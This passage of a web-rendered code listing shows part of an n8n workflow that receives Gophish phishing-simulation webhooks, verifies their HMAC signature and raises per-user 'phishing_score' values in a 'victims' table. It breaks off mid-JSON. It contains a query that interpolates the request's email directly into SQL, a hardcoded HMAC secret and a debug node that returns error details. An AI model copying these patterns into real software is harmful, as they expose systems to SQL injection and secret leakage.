class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br></pre></td><td class="code"><pre><span class="line">#json file</span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;Gophish to Phishing Score Database&quot;,</span><br><span class="line">  &quot;nodes&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;respondWith&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;responseBody&quot;: &quot;Error: No signature found in request header&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;c77c4304-a74e-4699-9b2c-52c7a8500fb4&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;no signature&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.respondToWebhook&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1.1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        660,</span><br><span class="line">        620</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;respondWith&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;responseBody&quot;: &quot;Error: Provided signature is not valid&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;da08f3e5-60c4-4898-ab28-d9f92aae2fe2&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;invalid signature&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.respondToWebhook&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1.1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1380,</span><br><span class="line">        540</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;operation&quot;: &quot;executeQuery&quot;,</span><br><span class="line">        &quot;query&quot;: &quot;UPDATE victims\nSET phishing_score = phishing_score + 10\nWHERE email = $1;&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;</span><br><span class="line">          &quot;queryReplacement&quot;: &quot;=&#123;&#123; $json.email &#125;&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;e83be7d7-0c4a-4ca8-b341-3a40739f8825&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Update Phishing Score for Clicked Event&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.mySql&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2.4,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        2360,</span><br><span class="line">        340</span><br><span class="line">      ],</span><br><span class="line">      &quot;credentials&quot;: &#123;</span><br><span class="line">        &quot;mySql&quot;: &#123;</span><br><span class="line">          &quot;id&quot;: &quot;qEqs6Hx9HRmSTg5v&quot;,</span><br><span class="line">          &quot;name&quot;: &quot;mariadb - phishing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;conditions&quot;: &#123;</span><br><span class="line">          &quot;options&quot;: &#123;</span><br><span class="line">            &quot;caseSensitive&quot;: true,</span><br><span class="line">            &quot;leftValue&quot;: &quot;&quot;,</span><br><span class="line">            &quot;typeValidation&quot;: &quot;strict&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;conditions&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;ad6553f3-0e01-497a-97b5-3eba88542a11&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;=&#123;&#123; $(&#x27;Webhook&#x27;).item.json.body.message &#125;&#125;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: 0,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;exists&quot;,</span><br><span class="line">                &quot;singleValue&quot;: true</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;2a041864-d4b5-4c7d-a887-68792d576a73&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;=&#123;&#123; $(&#x27;Webhook&#x27;).item.json.body.message &#125;&#125;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: &quot;Clicked Link&quot;,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;equals&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;filter.operator.equals&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;combinator&quot;: &quot;and&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;c4c08710-b02c-4625-bdc3-19de5653844d&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;If Clicked&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.if&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        2120,</span><br><span class="line">        320</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;operation&quot;: &quot;executeQuery&quot;,</span><br><span class="line">        &quot;query&quot;: &quot;UPDATE victims\nSET phishing_score = phishing_score + 50\nWHERE email = $1;&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;</span><br><span class="line">          &quot;queryReplacement&quot;: &quot;=&#123;&#123; $json.email &#125;&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;220e3d9d-07f1-425e-a139-a51308737a89&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Update Phishing Score for Submitted Data&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.mySql&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2.4,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        2360,</span><br><span class="line">        560</span><br><span class="line">      ],</span><br><span class="line">      &quot;credentials&quot;: &#123;</span><br><span class="line">        &quot;mySql&quot;: &#123;</span><br><span class="line">          &quot;id&quot;: &quot;qEqs6Hx9HRmSTg5v&quot;,</span><br><span class="line">          &quot;name&quot;: &quot;mariadb - phishing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;conditions&quot;: &#123;</span><br><span class="line">          &quot;options&quot;: &#123;</span><br><span class="line">            &quot;caseSensitive&quot;: true,</span><br><span class="line">            &quot;leftValue&quot;: &quot;&quot;,</span><br><span class="line">            &quot;typeValidation&quot;: &quot;strict&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;conditions&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;ad6553f3-0e01-497a-97b5-3eba88542a11&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;=&#123;&#123; $(&#x27;Webhook&#x27;).item.json.body.message &#125;&#125;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: 0,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;exists&quot;,</span><br><span class="line">                &quot;singleValue&quot;: true</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;2a041864-d4b5-4c7d-a887-68792d576a73&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;=&#123;&#123; $(&#x27;Webhook&#x27;).item.json.body.message &#125;&#125;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: &quot;Submitted Data&quot;,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;equals&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;filter.operator.equals&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;combinator&quot;: &quot;and&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;9f49f588-12b7-4e3a-8d1a-74898b215d60&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;If Submitted Data&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.if&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        2120,</span><br><span class="line">        500</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;respondWith&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;responseBody&quot;: &quot;Success: Phishing score is updated&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;58eecf3c-97e9-4879-aaec-cd5759cb1ef8&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Success&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.respondToWebhook&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1.1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        2660,</span><br><span class="line">        460</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;conditions&quot;: &#123;</span><br><span class="line">          &quot;options&quot;: &#123;</span><br><span class="line">            &quot;caseSensitive&quot;: true,</span><br><span class="line">            &quot;leftValue&quot;: &quot;&quot;,</span><br><span class="line">            &quot;typeValidation&quot;: &quot;strict&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;conditions&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;8e2c34bd-a337-41e1-94a4-af319a991680&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;=&#123;&#123; $json.signature &#125;&#125;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: &quot;=&#123;&#123; $json.calculated_signature &#125;&#125;&quot;,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;equals&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;filter.operator.equals&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;combinator&quot;: &quot;and&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;8b12bac8-f513-422e-a582-99f67b87b24f&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Compare signature&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.if&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1100,</span><br><span class="line">        340</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;respondWith&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;responseBody&quot;: &quot;=&#123;&#123; $json.message &#125;&#125; | &#123;&#123; JSON.stringify($json.error)&#125;&#125;&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;d3f8446a-81af-4e5a-894e-e0eab0596364&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;DEBUG: REMOVE SOON&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.respondToWebhook&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1.1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1620,</span><br><span class="line">        20</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;conditions&quot;: &#123;</span><br><span class="line">          &quot;options&quot;: &#123;</span><br><span class="line">            &quot;caseSensitive&quot;: true,</span><br><span class="line">            &quot;leftValue&quot;: &quot;&quot;,</span><br><span class="line">            &quot;typeValidation&quot;: &quot;strict&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;conditions&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;593bdf17-d38a-49a2-8431-d29679082aae&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;=&#123;&#123; $json.headers.hasField(&#x27;x-gophish-signature&#x27;) &#125;&#125;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: &quot;true&quot;,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;boolean&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;true&quot;,</span><br><span class="line">                &quot;singleValue&quot;: true</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;combinator&quot;: &quot;and&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;0abc2e19-6ccc-4114-bf27-938b98ad5819&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Check gophish header&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.if&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        440,</span><br><span class="line">        440</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;jsCode&quot;: &quot;const signatureHeader = $json.headers[\&quot;x-gophish-signature\&quot;];\nconst signature = signatureHeader.split(&#x27;=&#x27;)[1];\nreturn &#123; json: &#123; signature: signature, body: $json.body &#125; &#125;;&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;49aff93b-5d21-490d-a2af-95611d8f83d1&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Extract signature&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.code&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        660,</span><br><span class="line">        340</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;action&quot;: &quot;hmac&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;SHA256&quot;,</span><br><span class="line">        &quot;value&quot;: &quot;=&#123;&#123; JSON.stringify($json.body) &#125;&#125;&quot;,</span><br><span class="line">        &quot;dataPropertyName&quot;: &quot;calculated_signature&quot;,</span><br><span class="line">        &quot;secret&quot;: &quot;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;e406828a-0d97-44b8-8798-6d066c4a4159&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Calculate the signature&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.crypto&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 1,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        860,</span><br><span class="line">        340</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;conditions&quot;: &#123;</span><br><span class="line">          &quot;options&quot;: &#123;</span><br><span class="line">            &quot;caseSensitive&quot;: true,</span><br><span class="line">            &quot;leftValue&quot;: &quot;&quot;,</span><br><span class="line">            &quot;typeValidation&quot;: &quot;strict&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;conditions&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;4f69b753-a1ff-4376-88a0-032ede5d9223&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;=&#123;&#123; $json.keys() &#125;&#125;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: &quot;&quot;,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;array&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;empty&quot;,</span><br><span class="line">                &quot;singleValue&quot;: true</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;id&quot;: &quot;9605ee34-f897-48cf-93d9-756503337686&quot;,</span><br><span class="line">              &quot;leftValue&quot;: &quot;&quot;,</span><br><span class="line">              &quot;rightValue&quot;: &quot;&quot;,</span><br><span class="line">              &quot;operator&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;equals&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;filter.operator.equals&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;combinator&quot;: &quot;and&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;72f5d0bd-9025-4e7b-8d1f-8746035a2138&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;check if user exists in database&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.if&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1620,</span><br><span class="line">        240</span><br><span class="line">      ],</span><br><span class="line">      &quot;alwaysOutputData&quot;: true,</span><br><span class="line">      &quot;executeOnce&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;parameters&quot;: &#123;</span><br><span class="line">        &quot;operation&quot;: &quot;executeQuery&quot;,</span><br><span class="line">        &quot;query&quot;: &quot;SELECT * FROM victims where email = \&quot;&#123;&#123; $json.body.email &#125;&#125;\&quot; LIMIT 1&quot;,</span><br><span class="line">        &quot;options&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;id&quot;: &quot;5929bf85-d38b-4fdd-ae76-f0a61e2cef55&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Get current phishing score&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;n8n-nodes-base.mySql&quot;,</span><br><span class="line">      &quot;typeVersion&quot;: 2.4,</span><br><span class="line">      &quot;position&quot;: [</span><br><span class="line">        1380,</span><br><span class="line">        260</span><br><span class="line">      ],</span><br><span class="line">      